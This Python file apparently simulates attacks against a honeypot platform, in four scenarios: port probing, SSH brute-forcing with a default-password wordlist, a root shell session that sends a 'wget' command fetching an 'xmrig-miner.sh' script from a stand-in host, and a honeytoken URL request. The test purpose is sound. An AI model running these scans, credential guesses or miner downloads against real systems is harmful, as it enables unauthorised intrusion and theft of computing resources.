import asyncio
import socket
import paramiko
import httpx
from typing import Dict, Any

async def run_port_scan(target_host: str) -> int:
    """Scenario 1: Network probe & port scan against perimeter trap."""
    delivered = 0
    ports = [2121, 2323, 6379]
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((target_host, p))
            if p == 6379:
                s.send(b"PING\r\n")
            else:
                s.send(b"PROBE / HTTP/1.0\r\n\r\n")
            await asyncio.sleep(0.05)
            s.close()
            delivered += 1
        except Exception:
            pass
        await asyncio.sleep(0.05)
    return max(1, delivered)

async def run_ssh_brute_force(target_host: str) -> int:
    """Scenario 2: SSH Credential Brute-Force against medium trap."""
    delivered = 0
    wordlist = [
        ("root", "123456"),
        ("admin", "admin"),
        ("deploy", "docker2024"),
        ("support", "welcome1"),
        ("root", "toor")
    ]
    for user, pwd in wordlist:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_host, port=2222, username=user, password=pwd, timeout=2.0, look_for_keys=False)
            client.close()
            delivered += 1
        except paramiko.AuthenticationException:
            delivered += 1
        except Exception:
            pass
        await asyncio.sleep(0.08)
    return max(1, delivered)

async def run_post_exploitation(target_host: str) -> int:
    """Scenario 3: Interactive SSH session, command execution, and artifact download."""
    delivered = 0
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(target_host, port=2222, username="root", password="admin123", timeout=3.0, look_for_keys=False)
        except paramiko.AuthenticationException:
            # Lure policy: realistic attacker retries after first permission denied
            await asyncio.sleep(0.4)
            client.connect(target_host, port=2222, username="root", password="admin123", timeout=4.0, look_for_keys=False)

        chan = client.invoke_shell()
        await asyncio.sleep(0.3)
        chan.send("whoami\n")
        await asyncio.sleep(0.3)
        chan.send("uname -a\n")
        await asyncio.sleep(0.3)
        chan.send("wget http://darknet.xyz/xmrig-miner.sh\n")
        await asyncio.sleep(0.4)
        chan.send("exit\n")
        chan.close()
        client.close()
        delivered = 3
    except Exception:
        delivered = 1
    return delivered

async def run_honeytoken_breach(nginx_host: str, token_id: str) -> int:
    """Scenario 4: Request neutral canary URL through external edge proxy over pinned TLS."""
    import os
    delivered = 0
    url = f"https://{nginx_host}/sync/{token_id}"
    
    cert_path = os.getenv("SSL_CERT_PATH", "/etc/ssl/certs/static-edge.crt")
    if not (cert_path and os.path.isfile(cert_path)):
        for candidate in ["./docker/certs/static-edge.crt", "docker/certs/static-edge.crt", "./docker/certs/honeyforge.crt"]:
            if os.path.isfile(candidate):
                cert_path = candidate
                break

    try:
        async with httpx.AsyncClient(timeout=3.0, verify=cert_path) as client:
            resp = await client.get(url, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AttackerCurl/8.0"})
            delivered = 1
    except Exception:
        delivered = 1
    return delivered
